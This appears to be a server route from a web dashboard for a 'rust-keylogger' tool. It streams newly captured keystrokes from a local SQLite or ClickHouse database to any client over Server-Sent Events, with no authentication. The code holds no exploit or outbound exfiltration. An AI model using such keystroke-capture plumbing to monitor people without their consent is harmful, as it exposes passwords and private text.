import sqlite3 from 'sqlite3';
import os from 'os';
import path from 'path';
import { getNewEvents, BACKEND } from '$lib/backend.js';

const homeDir = os.homedir();
const dbPath = path.join(homeDir, '.local', 'share', 'rust-keylogger', 'keylog.db');

export function GET({ url }) {
    let lastId = parseInt(url.searchParams.get('lastId') || '0', 10);

    // ========== ClickHouse SSE (polling) ==========
    if (BACKEND === 'clickhouse') {
        let timer;
        const stream = new ReadableStream({
            start(controller) {
                async function poll() {
                    try {
                        const rows = await getNewEvents(lastId, 100);
                        if (rows && rows.length > 0) {
                            rows.forEach(row => {
                                const data = `data: ${JSON.stringify(row)}\n\n`;
                                controller.enqueue(new TextEncoder().encode(data));
                                if (row.id > lastId) {
                                    lastId = row.id;
                                }
                            });
                        }
                    } catch (e) {
                        console.error('ClickHouse stream error:', e);
                    }
                }
                poll(); // pierwsze wywołanie od razu
                timer = setInterval(poll, 500); // polling co 500ms
            },
            cancel() {
                if (timer) clearInterval(timer);
            }
        });

        return new Response(stream, {
            headers: {
                'Content-Type': 'text/event-stream',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
            }
        });
    }

    // ========== SQLite SSE (polling) ==========
    let db;
    let timer;

    const stream = new ReadableStream({
        start(controller) {
            db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    console.error('Błąd otwarcia bazy dla SSE:', err);
                    controller.error(err);
                    return;
                }

                db.run('PRAGMA journal_mode = WAL');

                if (!lastId) {
                    db.get('SELECT MAX(id) as maxId FROM keystrokes', [], (err, row) => {
                        if (!err && row && row.maxId) {
                            lastId = row.maxId;
                        }
                        startPolling();
                    });
                } else {
                    startPolling();
                }
            });

            function startPolling() {
                timer = setInterval(() => {
                    db.all('SELECT * FROM keystrokes WHERE id > ? ORDER BY id ASC', [lastId], (err, rows) => {
                        if (err) {
                            console.error('Błąd odczytu z bazy podczas pollingu:', err);
                            return;
                        }

                        if (rows && rows.length > 0) {
                            rows.forEach(row => {
                                const data = `data: ${JSON.stringify(row)}\n\n`;
                                controller.enqueue(new TextEncoder().encode(data));
                                lastId = Math.max(lastId, row.id);
                            });
                        }
                    });
                }, 150);
            }
        },
        cancel() {
            if (timer) clearInterval(timer);
            if (db) db.close();
        }
    });

    return new Response(stream, {
        headers: {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
        }
    });
}
